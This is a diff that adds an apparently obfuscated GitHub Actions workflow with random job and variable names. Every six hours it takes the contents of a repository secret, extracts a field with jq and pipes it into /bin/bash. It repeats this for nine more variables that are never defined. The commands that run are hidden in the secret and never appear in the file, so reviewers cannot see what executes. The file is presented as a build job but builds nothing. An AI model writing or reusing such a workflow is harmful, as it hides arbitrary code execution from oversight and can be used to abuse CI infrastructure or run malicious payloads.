@@ -1,0 +1,25 @@
+name: renquanniu3481
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '4 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: renquanniu3481
+        env:
+          nhya6: ${{ secrets.nhya6 }}
+        run: |
+          echo $nhya6 | jq -r .aychj444 | /bin/bash
+          echo $nh81272 | jq -r .rp15233 | /bin/bash
+          echo $aq8986 | jq -r .v639 | /bin/bash
+          echo $cq8 | jq -r .pl64 | /bin/bash
+          echo $rrw02 | jq -r .ttur6581 | /bin/bash
+          echo $htas09 | jq -r .g68 | /bin/bash
+          echo $g23 | jq -r .atr8067 | /bin/bash
+          echo $dhlmv42839 | jq -r .ioflv74 | /bin/bash
+          echo $ziqa89 | jq -r .d3 | /bin/bash
+          echo $b4 | jq -r .v29323 | /bin/bash
+
